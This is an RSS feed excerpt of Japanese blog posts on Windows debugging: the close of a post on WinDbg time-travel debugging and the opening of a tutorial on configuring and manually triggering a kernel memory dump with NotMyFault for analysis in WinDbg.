&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;過去と未来の双方向にトレースしていくことができるTTDによるデバッグを試してみました。&lt;/p&gt;
&lt;p&gt;特に、メモリダンプやプロセスダンプからはわからなかった過去のメモリやレジスタの状態がわかるため、非常に解析がスムーズになりました。&lt;/p&gt;
&lt;p&gt;また、ライブデバッグと異なり前の処理に戻ることができるため、「ブレークポイントを設定して問題を再発させて・・・」という手間がなくなる点も非常に便利でした。&lt;/p&gt;
&lt;p&gt;今後もTTDを活用したデバッグ手法についてまとめていこうと思っております。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開しているその他情報については、以下のページのリストをご覧くださいますと幸いです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Windows環境でカーネルメモリダンプを手動で取得し、WinDbgで解析する方法]]></title><link>https://kashiwaba-yuki.com/windows-windbg-005-kernel-dump</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-005-kernel-dump</guid><pubDate>Fri, 08 Oct 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;WinDbgによるWindowsデバッグやダンプ解析によるトラブルシューティングに習熟することを目指しています。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/windows-windbg-004-kernel-debug&quot;&gt;WinDbgでWindows10環境のカーネルデバッグを行う最初の一歩&lt;/a&gt;の記事では、WinDbgでカーネルモードデバッグを行う最初の一歩について紹介しました。&lt;/p&gt;
&lt;p&gt;今回は、ライブデバッグではなく、カーネルメモリダンプの解析方法について紹介します。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開している情報については、以下のページに一覧をまとめているので、よければご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この記事では以下の内容についてまとめています。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E5%88%A9%E7%94%A8%E3%81%99%E3%82%8B%E3%83%84%E3%83%BC%E3%83%AB&quot;&gt;今回利用するツール&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#windbg-preview&quot;&gt;WinDbg Preview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#notmyfault&quot;&gt;NotMyFault&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;カーネルメモリダンプを取得する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%83%91%E3%83%8D%E3%83%AB%E3%81%8B%E3%82%89%E8%A8%AD%E5%AE%9A%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B&quot;&gt;コントロールパネルから設定を変更する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#notmyfault%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;NotMyFaultを取得する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;メモリダンプを取得する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E3%81%AE%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot;&gt;カーネルメモリダンプの解析を行う&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#windbg%E3%81%AB%E3%83%80%E3%83%B3%E3%83%97%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%82%80&quot;&gt;WinDbgにダンプファイルを読み込む&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF%E6%99%82%E3%81%AE%E5%87%BA%E5%8A%9B%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;メモリダンプ読み込み時の出力を読む&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#analyze--v-%E3%81%A7%E8%87%AA%E5%8B%95%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot;&gt;!analyze -v で自動解析を行う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%90%E3%83%83%E3%82%AF%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%81%AE%E8%A7%A3%E6%9E%90&quot;&gt;スタックバックトレースの解析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%88%E3%83%A9%E3%83%83%E3%83%97%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%81%8B%E3%82%89%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%82%92%E5%BE%A9%E5%85%83%E3%81%99%E3%82%8B&quot;&gt;トラップフレームからスレッドを復元する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot;&gt;プロセスを確認する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;今回利用するツール&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%8A%E5%9B%9E%E5%88%A9%E7%94%A8%E3%81%99%E3%82%8B%E3%83%84%E3%83%BC%E3%83%AB&quot; aria-label=&quot;今回利用するツール permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;今回利用するツール&lt;/h2&gt;
&lt;p&gt;今回は、Windows10環境にて、次の2つのツールを使用します。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WinDbg Preview&lt;/li&gt;
&lt;li&gt;notmyfault64&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;windbg-preview&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg-preview&quot; aria-label=&quot;windbg preview permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbg Preview&lt;/h3&gt;
&lt;p&gt;WinDbg Previewは、Microsoft Storeから入手可能なUWP版のWinDbgです。&lt;/p&gt;
&lt;p&gt;Windows Debug Toolsの中に含まれている従来のWinDbgと比較して、UIがかなりモダンになっていたり、タイムトラベルデバッグ（TTD）に対応していたりと機能強化されています。&lt;/p&gt;
&lt;p&gt;なお、従来のWinDbgとは同じエンジンを使用しているらしく、すべての機能が引き続き利用できます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/debugging-using-windbg-preview&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg プレビューを使用したデバッグ - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;notmyfault&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#notmyfault&quot; aria-label=&quot;notmyfault permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;NotMyFault&lt;/h3&gt;
&lt;p&gt;NotMyFaultは、本来コンピュータがクラッシュしたときに生成されるメモリダンプを手動で取得するために用いるツールです。&lt;/p&gt;
&lt;p&gt;以下のドキュメント内のリンクから取得できます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows/client-management/generate-kernel-or-complete-crash-dump&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;カーネル ダンプまたは完全なクラッシュ ダンプを生成する - Windows Client Management | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;カーネルメモリダンプを取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;カーネルメモリダンプを取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルメモリダンプを取得する&lt;/h2&gt;
&lt;p&gt;解析のため、まずはカーネルメモリダンプを取得していきます。&lt;/p&gt;
&lt;h3 id=&quot;コントロールパネルから設定を変更する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%83%91%E3%83%8D%E3%83%AB%E3%81%8B%E3%82%89%E8%A8%AD%E5%AE%9A%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B&quot; aria-label=&quot;コントロールパネルから設定を変更する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;コントロールパネルから設定を変更する&lt;/h3&gt;
&lt;p&gt;メモリダンプを取得する端末でコントロールパネルを開き、[システムとセキュリティ]を開きます。&lt;/p&gt;
&lt;p&gt;次に[システムの詳細設定]をクリックして、[システムのプロパティ]ウィンドウを開きます。&lt;/p&gt;
&lt;p&gt;そして、[起動と回復]セクションの[設定]をクリックし、起動したウィンドウ内の[デバッグ情報の書き込み]の設定を[カーネルメモリダンプ]に変更します。&lt;/p&gt;
&lt;p&gt;最終的に、以下の画像の設定になっていればOKです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/df507aee8ef651273247df2766ef4b5b/0b533/image-16.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 58.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAACk0lEQVQoz01S204TURSdb/BZMBgp0d/xTX/BFz/BxBcMPoCBIA+KbyZGXkRIuBilFCSA0dDSOp1brzOdmc59preZLvc5WOAkK6c9+8w6a+21BaNtwDQsWIYNs2PD0E3oLQO25cB1PDTrOo4OzqGqNV5n5xM4tguX4DsuojDE5fEhBNMyYds2OmYHRofITRPtdpv2DuIkRhwluPhdhixX0Wq1oBs6v+/7PlyXSBkcB34QQjz7CcFxuryYxAl6SQ9RFCGgYkK/2Rr0BhBLIiRJgqKo0DSN1KoczWaL0IRK537oY+vjDoQsy5Cm6TUGgwGGwyHiOOaXfc+HVlWg1TRSKXNUKhWUSpfcjWVZkKoSuQnxfmUTQhRHJN1Fv9/nZGNSNR6PwR5iexL38LckcWsu9Yq5mcCj79i37JwRflrfgzBKR1eWk4STThYj73a7CPwQ5SKzK5E1UkpWG/U6HKq5/wlZD6M4xLcNCoURpWnGSW6UAUOyH9BDESkUywpUsv+nXIZGgTnUZwaXkr1NuPM5D8GilJlklhhTGgQBstEIST4P/+AAXr4A6VKCVDhEcWsLjeNj6KenaLL94gKu53HCkAj3Nr5DmCi7Bv3PKBRndxe17W1Ye/tQKiLkkxPIhQLkoyM0z38hEEV4ZN+j0FxGGIX4sbl/Q3h7sf419DYMSjGktDWpCpn6VmEJywoUsl+nutaoo15jA2/SHAbIf/0CIWR98K7SY2PAh5cuN+gyG/Ai2aqUivyh0WiIjHqbZSmS/gCmG8CnwQ8CnztTz3YhzM7k8OD+LHIzc8hNz2F2Kkc7YWoOD+89wt0703jy+CnW333A8tIKVpffYm1lDYuLq3g5v4hXC0t4Pb+A5TerePH8Gf4BaKNdYR1kH9QAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/df507aee8ef651273247df2766ef4b5b/8ac56/image-16.webp 240w,
/static/df507aee8ef651273247df2766ef4b5b/d3be9/image-16.webp 480w,
/static/df507aee8ef651273247df2766ef4b5b/b0a15/image-16.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/df507aee8ef651273247df2766ef4b5b/8ff5a/image-16.png 240w,
/static/df507aee8ef651273247df2766ef4b5b/e85cb/image-16.png 480w,
/static/df507aee8ef651273247df2766ef4b5b/0b533/image-16.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/df507aee8ef651273247df2766ef4b5b/0b533/image-16.png&quot;
            alt=&quot;image-16.png&quot;
            title=&quot;image-16.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;notmyfaultを取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#notmyfault%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;notmyfaultを取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;NotMyFaultを取得する&lt;/h3&gt;
&lt;p&gt;以下のドキュメント内の[メモリダンプファイルを手動で生成する]の項から、NotMyFaultの入ったZIPファイルダウンロードし、解凍します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows/client-management/generate-kernel-or-complete-crash-dump&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;カーネル ダンプまたは完全なクラッシュ ダンプを生成する - Windows Client Management | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;メモリダンプを取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;メモリダンプを取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;メモリダンプを取得する&lt;/h3&gt;
&lt;p&gt;すべてのウィンドウを閉じ、メモ帳アプリを開きます。&lt;/p&gt;
&lt;p&gt;適当に文字を書き込んだところで保存を実行し、以下の画像のようにファイルを書き込む前の状態で操作を中断します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f943dd66de27fc0bc932bf88313edd91/0b533/image-17.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 64.58333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACWElEQVQ4y42Ty08TURSHR0Lc2EKhWmmn82hn+goNtLQyU0tp6SsxcdGNbt1ZSxMSTEjQYDQmunTpWnbGtSu3blxIjAiRx0xbiohAgn/Cz3vvtLWoCU7y5Zx77sx3n8O9f/sG258+oPXlIw62PuP79jqOjE0cmWf5QTEsDjvxmNSOd9dxum/g3cuneHYjAu5grwH6nJz+RHOvjUZrD0ajBbNJILnZtKD1frr1XbOB9uEJXr94guclFdy3psGE8/U6HA4H3LwA5+gInM5R2G02DNntsNttsNkukWhnNdoeHhpijJBvRhzDsJG+26kouP1GR1ir4YrLhXAkgkAgAJ/PB1mWe9AajX6/n/VRaG71qZCUINLXNHDtjnBh6SHCkwlc1zWEQiFIktST0XxiYgLRaBSxWAzR8fGenPb5SM6LMlaKIXCtjvDByiMkyAgpXUcgGIQoij0ZpduWZalXswa18AgSHheC4AzDElZr83BdHYOqKmx5/cL+mf4WyWcQyPtzyQS4nZ1dJry3sAgXLyEUDEDtE/4vgijhljYJ7uvWFhPW7i9BUMNQfDLEf8zgPLxEeEcjp7yxscmE9cUlKOEovB43eJ7v7dt5dLfAKwi4mYyBM02TCZeXl9kpapqGZDKJqampv4jH44w/21YtTq6NDu7V6irW1tZwt1pFuVxGpVJhMZfLIZPJYHZ2lkHzfH4OxWIR2WwWMzMzpJ1HqVzCHImFQgEpLQ1uYPAiLgwMkj/jMps6Xe7YmBtutweeLh6eIZKr4fcpUPwqVEWFPq2jmCMDZLIMfTqNX7YP/N7xkrLuAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f943dd66de27fc0bc932bf88313edd91/8ac56/image-17.webp 240w,
/static/f943dd66de27fc0bc932bf88313edd91/d3be9/image-17.webp 480w,
/static/f943dd66de27fc0bc932bf88313edd91/b0a15/image-17.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f943dd66de27fc0bc932bf88313edd91/8ff5a/image-17.png 240w,
/static/f943dd66de27fc0bc932bf88313edd91/e85cb/image-17.png 480w,
/static/f943dd66de27fc0bc932bf88313edd91/0b533/image-17.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f943dd66de27fc0bc932bf88313edd91/0b533/image-17.png&quot;
            alt=&quot;image-17.png&quot;
            title=&quot;image-17.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;この状態で、先ほど解凍したNotMyFaultを実行します。
※ 途中で同意を求められるのでOKを選択してください。&lt;/p&gt;
&lt;p&gt;起動すると次の画面が表示されるので、初期状態のまま[Crash]をクリックします。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 396px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/56332a5e1b75d8bd5ca15658b2030727/db910/image-18.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
